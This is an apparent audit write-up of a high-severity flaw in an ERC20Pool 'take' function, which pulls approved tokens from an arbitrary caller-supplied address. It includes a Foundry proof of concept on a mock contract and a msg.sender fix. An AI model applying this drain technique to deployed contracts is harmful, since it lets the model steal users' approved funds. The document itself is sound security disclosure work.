---
title: Audit Daily Approved Tokens To A Pool Can Be Forced To Take
date: 2023-03-09 11:21:29
tags:
  - solidity
  - web3 security
  - audit
categories:
  - audit
---

## [H] Audit Daily Approved Tokens To A Pool Can Be Forced To Take

### Code snippet

> full code link

[https://github.com](https://github.com/sherlock-audit/2023-01-ajna/blob/main/contracts/src/ERC20Pool.sol#L460)

```javascipt
function take(
    address        borrowerAddress_,
    uint256        collateral_,
    address        callee_,
    bytes calldata data_
) external override nonReentrant {
    ...

    _transferQuoteTokenFrom(callee_, result.quoteTokenAmount);
}
```

### Impact

Anyone who invokes the toke function and passes in someone else who approved this pool could take the tokens.

### Proof of concept

I use foundry to make the whole test.

- 1.Firstly,we need to create our own ERC20 token and implement the quote contract.

```javascript
function setUp() public virtual {
    console.log("When transferring tokens...");
    alice = address(2);
    bob = address(3);

    myERC20 = new MyERC20();
    quote = new Quote(address(myERC20));

    //owner mint some token
    myERC20.mint(OWNERAMOUNT);

    //send some token to our dear testing user.
    myERC20.transfer(alice,SOMEAMOUNT);
    myERC20.transfer(bob,SOMEAMOUNT);
}
```

- 2.Use bob's address approved the pool some token.Check the balance of bob after we make the call.

```javascript
vm.prank(bob);
myERC20.approve(address(quote), SOMEAMOUNT);

//check bob balance step1.
assertEq(myERC20.balanceOf(bob), SOMEAMOUNT);
```

- 3.Use Alice's address to call the take function which is public within the quote contract.

```javascript
//alice transfer the approve tokens.
vm.prank(alice);
quote.take(address(bob), SOMEAMOUNT);
```

- 4.Finally, we check the balance of bob, if bob's token has been token by anyone who makes the call.

```javascript
//check bob balance step2.
assertEq(myERC20.balanceOf(bob), 0);
```

### Recommended mitigation steps

Alternatively, consider checking that callee has approved spending quote tokens to msg.sender.

```javascript
function take(
    address        borrowerAddress_,
    uint256        collateral_,
    address        callee_,
    bytes calldata data_
) external override nonReentrant {
    ...

    _transferQuoteTokenFrom(msg.sender, result.quoteTokenAmount);
}
```
